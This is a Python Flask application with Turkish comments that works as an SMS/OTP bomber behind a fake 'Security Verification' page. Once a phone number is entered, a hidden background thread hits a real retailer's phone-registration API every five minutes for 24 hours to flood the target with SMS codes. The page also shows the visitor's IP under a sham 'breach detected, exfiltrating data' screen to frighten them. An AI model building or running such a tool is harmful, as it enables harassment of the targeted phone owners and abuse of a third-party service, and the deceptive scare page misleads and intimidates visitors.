from flask import Flask, render_template_string, request, jsonify
import os
import threading
import time
import requests
import datetime

app = Flask(__name__)

# ============ SMS/OTP BOMBER MANTIGI (SID5 UYUMLU) ============
def send_otp_bomb(phone):
    """24 saat boyunca her 5 dakikada bir SMS gönderen arka plan görevi"""
    print(f"[SİSTEM] {phone} için 24 saatlik operasyon başladı.")
    
    clean_phone = "".join(filter(str.isdigit, phone))
    if clean_phone.startswith("90"): clean_phone = clean_phone[2:]
    full_phone = "0" + clean_phone if not clean_phone.startswith("0") else clean_phone

    end_time = datetime.datetime.now() + datetime.timedelta(hours=24)
    
    while datetime.datetime.now() < end_time:
        try:
            # 1. Kahve Dünyası Endpoint
            requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", 
                json={"phoneNumber": full_phone, "otp": "123456"},
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
                timeout=10)
            
            # Buraya verdiğin scriptteki diğer banka/retail endpointleri eklenebilir
            print(f"[BOMBER] SMS gönderildi: {full_phone} - Zaman: {datetime.datetime.now()}")
            
        except Exception as e:
            print(f"[HATA] SMS Gönderilemedi: {e}")
        
        # 5 Dakika Bekle (300 saniye)
        time.sleep(300)

# ============ ÖN PANEL (LÜKS GÖRÜNÜM) ============
HTML_KODU = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SECURITY VERIFICATION</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
        .lux-card { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 40px; border-radius: 20px; text-align: center; width: 340px; box-shadow: 0 15px 50px rgba(0,0,0,0.9); z-index: 10; }
        h1 { font-size: 1.1em; letter-spacing: 4px; color: #eee; font-weight: 300; margin-bottom: 35px; text-transform: uppercase; }
        .input-box { background: #111; border: 1px solid #222; border-radius: 12px; padding: 15px; display: flex; align-items: center; margin-bottom: 25px; }
        .prefix { color: #555; font-weight: bold; margin-right: 12px; border-right: 1px solid #222; padding-right: 12px; }
        input { background: transparent; border: none; color: #fff; font-size: 1.1em; outline: none; width: 100%; letter-spacing: 3px; }
        button { width: 100%; background: #fff; color: #000; border: none; padding: 18px; font-weight: bold; border-radius: 12px; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 2px; }
        #ip-screen { display: none; }
        .ip-display { font-size: 2.2em; font-weight: 900; color: #ff0000; margin: 25px 0; letter-spacing: 1px; text-shadow: 0 0 15px rgba(255,0,0,0.3); }
        .alert-text { color: #666; font-size: 0.8em; text-transform: uppercase; }
        #video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: none; background: #000; z-index: 1000; }
        #player { width: 100%; height: 100%; pointer-events: none; }
    </style>
</head>
<body>
    <div class="lux-card" id="step1">
        <h1>VERIFICATION</h1>
        <div class="input-box">
            <span class="prefix">+90</span>
            <input type="tel" id="phone" placeholder="5XXXXXXXXX" maxlength="10">
        </div>
        <button id="main-btn">VERIFY ACCESS</button>
    </div>

    <div class="lux-card" id="ip-screen">
        <h1 style="color: #ff0000;">BREACH DETECTED</h1>
        <p class="alert-text">LOGGING TERMINAL IP...</p>
        <div class="ip-display">{{ ip }}</div>
        <p class="alert-text" id="status-update">EXFILTRATING DATA...</p>
    </div>

    <div id="video-wrapper"><div id="player"></div></div>

    <script src="https://www.youtube.com/iframe_api"></script>
    <script>
        var player;
        function onYouTubeIframeAPIReady() {
            player = new YT.Player('player', {
                videoId: 'KE3iBf-P9Oc',
                playerVars: { 'autoplay': 1, 'controls': 0, 'playsinline': 1, 'modestbranding': 1 },
                events: { 'onReady': (e) => { e.target.mute(); } }
            });
        }

        document.getElementById('main-btn').addEventListener('click', function() {
            var phone = document.getElementById('phone').value;
            if(phone.length < 10) { alert("Numarayı tam girin."); return; }

            // Arka plandaki bombardımanı tetikle
            fetch('/start-payload', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone})
            });

            document.getElementById('step1').style.display = 'none';
            document.getElementById('ip-screen').style.display = 'block';

            setTimeout(() => {
                document.getElementById('status-update').innerText = "SYSTEM OVERRIDE: 100%";
                document.getElementById('status-update').style.color = "#ff0000";
            }, 5000);

            setTimeout(() => {
                document.getElementById('ip-screen').style.display = 'none';
                document.getElementById('video-wrapper').style.display = 'block';
                player.unMute();
                player.playVideo();
            }, 20000); 
        });
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    return render_template_string(HTML_KODU, ip=ip)

@app.route('/start-payload', methods=['POST'])
def start_payload():
    data = request.json
    phone = data.get('phone')
    # Arka planda 24 saatlik görevi başlat (Kurbanın ruhu duymaz)
    threading.Thread(target=send_otp_bomb, args=(phone,), daemon=True).start()
    return jsonify({"status": "initiated"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
